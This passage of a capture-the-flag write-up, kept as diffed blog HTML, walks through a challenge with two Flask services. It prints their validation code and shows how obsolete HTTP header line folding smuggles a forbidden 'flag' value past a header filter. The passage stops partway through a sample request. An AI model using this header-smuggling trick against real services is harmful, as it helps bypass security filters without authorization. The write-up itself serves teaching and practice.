+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		resp <span style="color:#5bc4bf">=</span> Response(body)
+</span></span><span style="display:flex;"><span>		resp<span style="color:#5bc4bf">.</span>status <span style="color:#5bc4bf">=</span> statusCode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">for</span> headerName <span style="color:#5bc4bf">in</span> headers:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">for</span> badHeaderName <span style="color:#5bc4bf">in</span> badHeaderNames:
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">if</span>(badHeaderName <span style="color:#5bc4bf">not</span> <span style="color:#5bc4bf">in</span> headerName<span style="color:#5bc4bf">.</span>lower()):
+</span></span><span style="display:flex;"><span>					resp<span style="color:#5bc4bf">.</span>headers[headerName] <span style="color:#5bc4bf">=</span> headers[headerName]
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">@app</span><span style="color:#5bc4bf">.</span>route(<span style="color:#48b685">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">index</span>():
+</span></span><span style="display:flex;"><span>	resp <span style="color:#5bc4bf">=</span> Response(<span style="color:#48b685">&#39;hi&#39;</span>)
+</span></span><span style="display:flex;"><span>	resp<span style="color:#5bc4bf">.</span>headers[<span style="color:#48b685">&#39;Content-Type&#39;</span>] <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;text/plain&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">if</span>(__name__ <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;__main__&#39;</span>):
+</span></span><span style="display:flex;"><span>	app<span style="color:#5bc4bf">.</span>run(port<span style="color:#5bc4bf">=</span><span style="color:#f99b15">8000</span>)
+</span></span></code></pre></div></details>
+<p>The <strong>firewalled-curl</strong> service takes our json input and transforms it into the raw http 1.1 request.
+The flag is within the <strong>flag-container</strong> service. We can reach it via <strong>firewalled-curl</strong> because only <strong>firewalled-curl</strong> is exposed to the internet.</p>
+<p>The simple request to <strong>flag-container</strong> looks like this:</p>
+<p><img src="/images/QYXSLpMSGQG2Nn4ko9A0b0-LZnIH_SLa" alt="img"></p>
+<blockquote>
+<p><code>Tm8gZmxhZyBmb3IgeW91IDoo</code> is <code>No flag for you :(</code> in base64</p>
+</blockquote>
+<p>Here we&rsquo;re initially requesting <strong>firewalled-curl</strong>. It takes our parameters (host, headers, method, and path) and makes another request to <strong>flag-container</strong>.</p>
+<p><code>flag-container:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#5bc4bf">@app</span><span style="color:#5bc4bf">.</span>route(<span style="color:#48b685">&#39;/flag&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">index</span>():
+</span></span><span style="display:flex;"><span>[<span style="color:#ef6155">!</span>]	args <span style="color:#5bc4bf">=</span> request<span style="color:#5bc4bf">.</span>args<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685">&#39;args&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>[<span style="color:#ef6155">!</span>]		r <span style="color:#5bc4bf">=</span> requests<span style="color:#5bc4bf">.</span>post(<span style="color:#48b685">&#39;http://firewalled-curl/req&#39;</span>,json<span style="color:#5bc4bf">=</span>json<span style="color:#5bc4bf">.</span>loads(args))<span style="color:#5bc4bf">.</span>json()
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span> <span style="color:#48b685">&#39;request&#39;</span> <span style="color:#5bc4bf">in</span> r <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> r[<span style="color:#48b685">&#39;request&#39;</span>] <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> request<span style="color:#5bc4bf">.</span>headers[<span style="color:#48b685">&#39;X-Request&#39;</span>]:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">return</span> flag
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">except</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">pass</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#48b685">&#39;No flag for you :(&#39;</span>
+</span></span></code></pre></div><p>So to get the flag, we need 2 things:</p>
+<p>Firstly &ndash; pass to the route the correct <strong>args</strong> parameter.</p>
+<p>The route makes another request via <strong>firewalled-curl</strong> using the <strong>args</strong> parameter (<code>[!]</code> lines).</p>
+<p>To pass the checks, we need to get the json response that must contain the <strong>request</strong> key with the <strong>flag</strong> value like so <code>{&quot;request&quot;:&quot;flag&quot;}</code>. We can&rsquo;t do it right away because <strong>firewalled-curl</strong> checks whether the response is json and contains <strong>flag</strong> within it:</p>
+<p><code>firewalled-curl:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">isJson</span>(s):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>	    json<span style="color:#5bc4bf">.</span>loads(s)
+</span></span><span style="display:flex;"><span>	    <span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">except</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkJson</span>(j):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(type(j) <span style="color:#5bc4bf">==</span> str):
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span>(<span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> j<span style="color:#5bc4bf">.</span>lower()):
+</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">elif</span>(type(j) <span style="color:#5bc4bf">==</span> list):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">for</span> entry <span style="color:#5bc4bf">in</span> j:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(<span style="color:#5bc4bf">not</span> checkJson(entry)):
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">elif</span>(type(j) <span style="color:#5bc4bf">==</span> dict):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">for</span> entry <span style="color:#5bc4bf">in</span> j:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span>(<span style="color:#5bc4bf">not</span> checkJson(j[entry])):
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">else</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">@app</span><span style="color:#5bc4bf">.</span>route(<span style="color:#48b685">&#39;/req&#39;</span>,methods<span style="color:#5bc4bf">=</span>[<span style="color:#48b685">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">req</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">..</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&lt;</span>make request<span style="color:#5bc4bf">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&lt;</span>send request<span style="color:#5bc4bf">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&lt;</span>get response<span style="color:#5bc4bf">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">..</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span>(isJson(body<span style="color:#5bc4bf">.</span>decode())):
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span>(<span style="color:#5bc4bf">not</span> checkJson(json<span style="color:#5bc4bf">.</span>loads(body<span style="color:#5bc4bf">.</span>decode()))):
+</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">return</span> {<span style="color:#48b685">&#39;success&#39;</span>:<span style="color:#815ba4">False</span>,<span style="color:#48b685">&#39;error&#39;</span>:<span style="color:#48b685">&#39;unsafe json&#39;</span>}
+</span></span></code></pre></div><p>Secondly &ndash; to pass the <code>'flag' in request.headers['X-Request']</code> check, we need to send a request that will contain the <strong>X-Request</strong> header with the <strong>flag</strong> value within it. The service also prohibits us from doing this by checking that the <strong>flag</strong> string isn&rsquo;t within any header value.</p>
+<p>I decided to start with that second check because it looked way simpler than the first one &ndash; you don&rsquo;t need the second request.</p>
+<h2 id="request-validation">Request validation</h2>
+<p>The <strong>/req</strong> endpoint starts with these lines:</p>
+<p><code>firewalled-curl:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#5bc4bf">@app</span><span style="color:#5bc4bf">.</span>route(<span style="color:#48b685">&#39;/req&#39;</span>,methods<span style="color:#5bc4bf">=</span>[<span style="color:#48b685">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">req</span>():
+</span></span><span style="display:flex;"><span>	params <span style="color:#5bc4bf">=</span> request<span style="color:#5bc4bf">.</span>json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	hostname,port <span style="color:#5bc4bf">=</span> checkHostname(params[<span style="color:#48b685">&#39;host&#39;</span>])
+</span></span><span style="display:flex;"><span>	headers <span style="color:#5bc4bf">=</span> checkHeaders(params[<span style="color:#48b685">&#39;headers&#39;</span>])
+</span></span><span style="display:flex;"><span>	method <span style="color:#5bc4bf">=</span> checkMethod(params[<span style="color:#48b685">&#39;method&#39;</span>])
+</span></span><span style="display:flex;"><span>	path <span style="color:#5bc4bf">=</span> checkPath(params[<span style="color:#48b685">&#39;path&#39;</span>])
+</span></span><span style="display:flex;"><span>	returnJson <span style="color:#5bc4bf">=</span> bool(params[<span style="color:#48b685">&#39;returnJson&#39;</span>])
+</span></span><span style="display:flex;"><span>	body <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">for</span> p <span style="color:#5bc4bf">in</span> [hostname,headers,body,method,path]:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span>(isinstance(p,<span style="color:#ef6155">Exception</span>)):
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">return</span> {<span style="color:#48b685">&#39;success&#39;</span>:<span style="color:#815ba4">False</span>,<span style="color:#48b685">&#39;error&#39;</span>:str(p)}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(method <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;POST&#39;</span>):
+</span></span><span style="display:flex;"><span>		body <span style="color:#5bc4bf">=</span> str(params[<span style="color:#48b685">&#39;body&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	httpRequest <span style="color:#5bc4bf">=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;</span><span style="color:#f99b15">{</span>method<span style="color:#f99b15">}</span><span style="color:#48b685"> </span><span style="color:#f99b15">{</span>path<span style="color:#f99b15">}</span><span style="color:#48b685"> HTTP/1.1</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(port <span style="color:#5bc4bf">==</span> <span style="color:#f99b15">80</span>):
+</span></span><span style="display:flex;"><span>		httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;Host: </span><span style="color:#f99b15">{</span>hostname<span style="color:#f99b15">}</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">else</span>:
+</span></span><span style="display:flex;"><span>		httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;Host: </span><span style="color:#f99b15">{</span>hostname<span style="color:#f99b15">}</span><span style="color:#48b685">:</span><span style="color:#f99b15">{</span>port<span style="color:#f99b15">}</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;Connection: close</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(body):
+</span></span><span style="display:flex;"><span>		httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;Content-Length: </span><span style="color:#f99b15">{</span>str(len(body))<span style="color:#f99b15">}</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">for</span> headerName <span style="color:#5bc4bf">in</span> headers:
+</span></span><span style="display:flex;"><span>		httpRequest<span style="color:#5bc4bf">+=</span> <span style="color:#48b685">f</span><span style="color:#48b685">&#39;</span><span style="color:#f99b15">{</span>headerName<span style="color:#f99b15">}</span><span style="color:#48b685">: </span><span style="color:#f99b15">{</span>headers[headerName]<span style="color:#f99b15">}</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	httpRequest <span style="color:#5bc4bf">+=</span> <span style="color:#48b685">&#39;</span><span style="color:#f99b15">\r\n</span><span style="color:#48b685">&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(body):
+</span></span><span style="display:flex;"><span>		httpRequest <span style="color:#5bc4bf">+=</span> body
+</span></span><span style="display:flex;"><span>	httpRequest <span style="color:#5bc4bf">=</span> httpRequest<span style="color:#5bc4bf">.</span>encode()
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">..</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&lt;</span>sending request via socker<span style="color:#5bc4bf">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&lt;</span>receiving response<span style="color:#5bc4bf">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">..</span>
+</span></span></code></pre></div><p>So we need somehow pass the <code>X-Request: flag</code> header. Here&rsquo;s what the <code>checkHeaders</code> looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>isSafeAscii <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">lambda</span> s : <span style="color:#5bc4bf">not</span> re<span style="color:#5bc4bf">.</span>search(<span style="color:#48b685">r</span><span style="color:#48b685">&#39;[^\x20-\x7F]&#39;</span>,s)
+</span></span><span style="display:flex;"><span>isSafeHeader <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">lambda</span> s : isSafeAscii(s)
+</span></span><span style="display:flex;"><span>badHeaderNames <span style="color:#5bc4bf">=</span> [<span style="color:#48b685">&#39;encoding&#39;</span>,<span style="color:#48b685">&#39;type&#39;</span>,<span style="color:#48b685">&#39;charset&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkHeaders</span>(headers):
+</span></span><span style="display:flex;"><span>	newHeaders <span style="color:#5bc4bf">=</span> {}
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(type(headers) <span style="color:#5bc4bf">is</span> <span style="color:#5bc4bf">not</span> dict):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe headers&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">for</span> headerName <span style="color:#5bc4bf">in</span> headers:
+</span></span><span style="display:flex;"><span>		headerValue <span style="color:#5bc4bf">=</span> str(headers[headerName])
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span> (isSafeHeader(headerName) <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;:&#39;</span> <span style="color:#5bc4bf">not</span> <span style="color:#5bc4bf">in</span> headerName) <span style="color:#5bc4bf">and</span> isSafeHeader(headerValue):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			isBad <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">False</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">for</span> badHeaderName <span style="color:#5bc4bf">in</span> badHeaderNames:
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">if</span> badHeaderName <span style="color:#5bc4bf">in</span> headerName<span style="color:#5bc4bf">.</span>lower():
+</span></span><span style="display:flex;"><span>					isBad <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#815ba4">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span> <span style="color:#48b685">&#34;flag&#34;</span> <span style="color:#5bc4bf">in</span> headerValue<span style="color:#5bc4bf">.</span>lower():
+</span></span><span style="display:flex;"><span>				isBad <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">True</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">if</span> isBad:
+</span></span><span style="display:flex;"><span>				<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;bad headers&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			newHeaders[headerName] <span style="color:#5bc4bf">=</span> headerValue
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> newHeaders
+</span></span></code></pre></div><p>Looks pretty safe. It iterates over all the headers and ensures that both the header key and value are within the <code>\x20-\x7F</code> range. Also, it checks that header keys don&rsquo;t contain <code>:</code> and header values don&rsquo;t contain a <code>flag</code> substring. So we can&rsquo;t pass a header value with <code>flag</code> within it nor inject a new header value.</p>
+<p>It&rsquo;s also worth checking other validation functions &ndash; due to the http 1.1 format:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#06b6ef">GET</span> <span style="color:#fec418">/</span> <span style="color:#815ba4">HTTP</span><span style="color:#5bc4bf">/</span><span style="color:#f99b15">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#5bc4bf">:</span> <span style="color:#f99b15">example.com</span>
+</span></span><span style="display:flex;"><span>Key<span style="color:#5bc4bf">:</span> <span style="color:#f99b15">value</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>body
+</span></span></code></pre></div><p>It&rsquo;s possible to inject new headers if we can pass new lines to the method, path, or host.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkHostname</span>(name):
+</span></span><span style="display:flex;"><span>	name <span style="color:#5bc4bf">=</span> str(name)
+</span></span><span style="display:flex;"><span>	port <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;80&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(<span style="color:#48b685">&#39;:&#39;</span> <span style="color:#5bc4bf">in</span> name):
+</span></span><span style="display:flex;"><span>		sp <span style="color:#5bc4bf">=</span> name<span style="color:#5bc4bf">.</span>split(<span style="color:#48b685">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>		name <span style="color:#5bc4bf">=</span> sp[<span style="color:#f99b15">0</span>]
+</span></span><span style="display:flex;"><span>		port <span style="color:#5bc4bf">=</span> sp[<span style="color:#f99b15">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(
+</span></span><span style="display:flex;"><span>		(
+</span></span><span style="display:flex;"><span>		re<span style="color:#5bc4bf">.</span>search(<span style="color:#48b685">r</span><span style="color:#48b685">&#39;^[a-z0-9][a-z0-9\.-]+$&#39;</span>,name) <span style="color:#5bc4bf">or</span>
+</span></span><span style="display:flex;"><span>		re<span style="color:#5bc4bf">.</span>search(<span style="color:#48b685">r</span><span style="color:#48b685">&#39;^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$&#39;</span>,name)
+</span></span><span style="display:flex;"><span>		) <span style="color:#5bc4bf">and</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f99b15">0</span> <span style="color:#5bc4bf">&lt;</span> int(port) <span style="color:#5bc4bf">&lt;</span> <span style="color:#f99b15">0x10000</span>
+</span></span><span style="display:flex;"><span>	):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> name,int(port)
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe port&#39;</span>),<span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe hostname&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkMethod</span>(method):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(method <span style="color:#5bc4bf">in</span> [<span style="color:#48b685">&#39;GET&#39;</span>,<span style="color:#48b685">&#39;POST&#39;</span>]):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> method
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe method&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>isSafePath <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">lambda</span> s : s[<span style="color:#f99b15">0</span>] <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;/&#39;</span> <span style="color:#5bc4bf">and</span> isSafeAscii(s) <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39; &#39;</span> <span style="color:#5bc4bf">not</span> <span style="color:#5bc4bf">in</span> s
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">checkPath</span>(path):
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">if</span>(isSafePath(path)):
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">return</span> path
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#ef6155">Exception</span>(<span style="color:#48b685">&#39;unsafe path&#39;</span>)
+</span></span></code></pre></div><p>All the functions look safe without the possibility of injection of new headers.</p>
+<p>At this point, we need to figure out how to bypass one of the checks or to cause a parsing difference between these services. I tried a few things, but it seems impossible to do with such a limited charset <code>\x20-\x7F</code>.</p>
+<h2 id="solution-to-the-first-problem">Solution to the first problem</h2>
+<p>I spent a good amount of time trying to bypass the checks, and in the end, it turned out that Flask supports line folding of header fields.</p>
+<p>From <a href="https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4">https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4</a></p>
+<blockquote>
+<p>Historically, HTTP header field values could be extended over multiple lines by preceding each extra line with at least one space or horizontal tab (obs-fold).</p>
+</blockquote>
+<p>It means that if we send</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#ef6155">X-Request: something
+</span></span></span><span style="display:flex;"><span><span style="color:#ef6155"> flag: x
+</span></span></span></code></pre></div><p>Flask will get only one header &ndash; <code>(&quot;X-Request&quot;, &quot;something flag: x&quot;)</code>. And it will bypass <strong>firewalled-curl</strong> protections because the <strong>flag</strong> substring is allowed within the header name, and space <code>\x20</code> is within the charset.</p>
+<p>We can verify it by changing a bit of the <strong>flag-container</strong> source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#5bc4bf">@app</span><span style="color:#5bc4bf">.</span>route(<span style="color:#48b685">&#39;/flag&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">index</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">*</span>   <span style="color:#815ba4">if</span> <span style="color:#48b685">&#39;X-Request&#39;</span> <span style="color:#5bc4bf">in</span> request<span style="color:#5bc4bf">.</span>headers:
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">*</span>       print(request<span style="color:#5bc4bf">.</span>headers[<span style="color:#48b685">&#34;X-Request&#34;</span>], <span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> request<span style="color:#5bc4bf">.</span>headers[<span style="color:#48b685">&#34;X-Request&#34;</span>], flush<span style="color:#5bc4bf">=</span><span style="color:#815ba4">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    args <span style="color:#5bc4bf">=</span> request<span style="color:#5bc4bf">.</span>args<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685">&#39;args&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>		r <span style="color:#5bc4bf">=</span> requests<span style="color:#5bc4bf">.</span>post(<span style="color:#48b685">&#39;http://firewalled-curl/req&#39;</span>,json<span style="color:#5bc4bf">=</span>json<span style="color:#5bc4bf">.</span>loads(args))<span style="color:#5bc4bf">.</span>json()
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">if</span> <span style="color:#48b685">&#39;request&#39;</span> <span style="color:#5bc4bf">in</span> r <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> r[<span style="color:#48b685">&#39;request&#39;</span>] <span style="color:#5bc4bf">and</span> <span style="color:#48b685">&#39;flag&#39;</span> <span style="color:#5bc4bf">in</span> request<span style="color:#5bc4bf">.</span>headers[<span style="color:#48b685">&#39;X-Request&#39;</span>]:
+</span></span><span style="display:flex;"><span>			<span style="color:#815ba4">return</span> flag
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">except</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#815ba4">pass</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#815ba4">return</span> <span style="color:#48b685">&#39;No flag for you :(&#39;</span>
+</span></span></code></pre></div><p>Rebuild the container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>% docker-compose up --build
+</span></span></code></pre></div><p>And now, if we send the following request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#06b6ef">POST</span> <span style="color:#fec418">/req</span> <span style="color:#815ba4">HTTP</span><span style="color:#5bc4bf">/</span><span style="color:#f99b15">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#5bc4bf">:</span> <span style="color:#f99b15">localhost:8000</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#5bc4bf">:</span> <span style="color:#f99b15">application/json</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#5bc4bf">:</span> <span style="color:#f99b15">128</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
